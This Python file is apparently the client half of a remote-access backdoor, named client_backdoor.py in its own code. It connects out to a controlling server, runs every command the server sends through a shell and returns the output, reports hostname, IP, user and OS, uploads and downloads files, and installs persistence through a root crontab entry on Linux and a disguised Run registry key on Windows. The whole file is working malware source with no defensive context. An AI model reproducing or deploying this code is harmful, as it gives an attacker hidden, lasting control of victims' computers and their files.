import socket
import subprocess
from sys import stderr
from sys import stdout
import os
import platform     
import base64
import shutil
from sys import *

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# IP DEL SERVER
ip = "127.0.0.1"
port = 1212
prova = "Command complete :)"
prova2 = prova.encode()


def conection():
    global connection
    server_ip = (ip,port)
    client.connect(server_ip)

conection()



def shell():
    actual_directory = os.getcwd()
    actual_directory2 = actual_directory.encode()
    client.send(actual_directory2)
    while True:
        command = client.recv(1024)
        command2 = command.decode()
        ps = subprocess.Popen(command2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = ps.stdout.read()
        sin_result = len(output)
        cd_len = len(command2)
        output_fail = ps.stderr.read()
        client.send(output + output_fail)
        if command2[:2] == "cd":
            os.chdir(command2[3:])
            final = os.getcwd()
            final_2 = final.encode()
            client.send(final_2)
        elif sin_result == 0:
            client.send(prova2)
        elif command2 == "alias":
            b = "funciona"
            bb = b.encode()
            client.send(bb)
        elif command2[:8] == "download":
            print("jnfshdfbsjdfj")
            with open(command2[9:],"rb") as filejj:
                client.send(base64.b64encode(filejj.read()))
        
        

def sys_info():
        hostname = socket.gethostname()
        hostname2 = hostname.encode()
        client.send(hostname2)

        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(local_ip)
        interfaces2 = local_ip.encode()
        client.send(interfaces2)

        user = str(os.popen('whoami').read())
        user2 = str(user)
        user3 = user2.encode()
        client.send(user3)

        oss = str(platform.system())
        if oss == "Linux":
            distro = str(os.popen('lsb_release -d').read())
            distro2 = distro.encode()
            client.send(distro2)
            print(distro2)
        else:
            so = oss
            so_release = str(platform.release())
            so2 = str(so," ",so_release)
            so3 = so2.encode()
            client.send(so3)
        
        type_shell = str(os.popen('echo $SHELL').read())
        shell2 = type_shell.encode()
        client.send(shell2)
        choose()

def download():
    while True:
        recv_download = client.recv(1024)
        recv_download2 = recv_download.decode()
        print(recv_download2)
        if recv_download2[:8] == "download":
            with open(recv_download2[9:],"rb") as filejj:
                client.send(base64.b64encode(filejj.read()))
        break

def upload():
    while True:
        recv_upload = client.recv(1024)
        recv_upload2 = recv_upload.decode()
        command_len = len(recv_upload2)
        if command_len == 0:
            continue
        if recv_upload2[:6] == "upload":
            with open(recv_upload2[7:],"wb") as filejj:
                recivir = client.recv(30000)
                filejj.write(base64.b64decode(recivir))
        break    

def persistence():
    so = str(platform.system())

    if so == "Linux":
        os.system('cp client_backdoor.py /usr/bin/client_backdoor.py')
        os.system("echo '*/1 * * * * python3 /usr/bin/client_backdoor.py' >> /var/spool/cron/crontabs/root")
    elif so == "Windows":
        print("Windows")
        location = os.environ['appdata'] + '\\windows64.exe'
        if not os.path.exists(location):
            shutil.copyfile(sys.executable,location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)

    else:
        print("This system not allow this option")
    choose()
        

def choose2():
    escoje = client.recv(1024)
    escoje2 = escoje.decode()
    print(escoje2)
    if escoje2 == "1":
        shell()
    elif escoje2 == "2":
        sys_info()
    elif escoje2 == "3":
        download()
    elif escoje2 == "4":
        upload()
    elif escoje2 == "5":
        persistence()



def choose():
    escoje = client.recv(1024)
    escoje2 = escoje.decode()
    print(escoje2)
    if escoje2 == "1":
        shell()
    elif escoje2 == "2":
        sys_info()
    elif escoje2 == "3":
        download()
    elif escoje2 == "4":
        upload()
    elif escoje2 == "5":
        persistence()
    elif escoje2 == "menu":
        choose2()

choose()



